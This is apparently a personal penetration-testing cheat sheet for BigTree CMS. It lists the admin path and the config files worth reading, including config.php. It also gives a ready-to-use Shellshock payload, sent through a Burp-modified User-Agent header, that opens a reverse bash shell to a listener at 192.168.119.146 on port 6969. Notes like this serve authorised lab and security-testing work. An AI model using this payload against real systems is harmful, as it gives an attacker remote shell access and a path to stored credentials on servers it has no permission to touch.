# bigtree cms

## Admin Page

```bash
Try adding /admin after base-url.
```

## Interesting Files

```bash
# base dir /var/www/html
- /templates/config/*
- config.php
```

## Shellsock Test

```bash
# run nikto to confirm for Shellsock

Using Burp and changing 
User-Agent : () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.146/6969 0>&1'
```
